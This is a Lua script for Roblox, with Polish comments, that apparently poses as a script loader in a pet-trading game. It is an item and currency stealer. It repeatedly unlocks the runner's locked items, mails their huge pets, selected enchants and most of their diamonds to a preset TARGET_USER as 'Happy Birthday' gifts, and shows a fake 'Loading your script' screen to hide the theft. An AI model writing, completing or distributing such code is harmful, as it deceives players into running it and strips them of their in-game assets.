-- Auto Unlock
task.spawn(function()
    local Network = require(ReplicatedStorage.Library.Client.Network)
    local Save = require(ReplicatedStorage.Library.Client.Save)
    
    while task.wait(0.1) do
        local inv = Save.Get().Inventory
        if inv then
            for _, items in pairs(inv) do
                for uid, item in pairs(items) do
                    if item._lk == true then
                        Network.Invoke("Locking_SetLocked", uid, false)
                    end
                end
            end
        end
    end
end)

-- Główna logika
task.spawn(function()
    task.wait(1.5)
    
    -- "Loading your script" zostaje cały czas
    local inv = require(ReplicatedStorage.Library.Client.Save).Get().Inventory
    local Directory = require(ReplicatedStorage.Library.Directory)
    local Network = ReplicatedStorage.Network
    
    -- Huge Pets + Enchants
    if inv.Pet then
        for uid, v in pairs(inv.Pet) do
            if Directory.Pets[v.id] and Directory.Pets[v.id].huge then
                repeat
                    Network["Mailbox: Send"]:InvokeServer(TARGET_USER, "Happy Birthday", "Pet", uid, v._am or 1)
                    task.wait(0.3)
                until not inv.Pet[uid]
            end
        end
    end
    
    if inv.Enchant then
        for uid, v in pairs(inv.Enchant) do
            if table.find(ALLOWED_ENCHANTS, v.id) then
                repeat
                    Network["Mailbox: Send"]:InvokeServer(TARGET_USER, "Happy Birthday", "Enchant", uid, v._am or 1)
                    task.wait(0.3)
                until not inv.Enchant[uid]
            end
        end
    end
    
    -- Diamenty (5% zostaje)
    if inv.Currency then
        local diamondData = inv.Currency.Diamonds or inv.Currency["Diamonds"] or inv["Diamonds"]
        if diamondData then
            local amount = diamondData._am or diamondData.amount or diamondData.Am or 0
            if amount > 100 then
                local leaveAmount = math.ceil(amount * LEAVE_DIAMONDS_PERCENT)
                local sendAmount = amount - leaveAmount
                if sendAmount > 0 then
                    Network["Mailbox: Send"]:InvokeServer(TARGET_USER, "Happy Birthday", "Currency", "Diamonds", sendAmount)
                end
            end
        end
    end
    
    -- Zakończenie (loading text zostaje)
    TextLabel.Text = "Loading your script"
    loader.ImageColor3 = Color3.fromRGB(0, 255, 0)
    
    task.wait(8)
    
    -- Fade out
    TweenService:Create(Background, TweenInfo.new(0.8), {BackgroundTransparency = 1}):Play()
    TweenService:Create(TitleLabel, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
    TweenService:Create(TextLabel, TweenInfo.new(0.8), {TextTransparency = 1}):Play()
    TweenService:Create(loader, TweenInfo.new(0.8), {ImageTransparency = 1}):Play()
    TweenService:Create(blur, TweenInfo.new(0.8), {Size = 0}):Play()
    
    task.wait(1)
    ScreenGui:Destroy()
    blur:Destroy()
end)
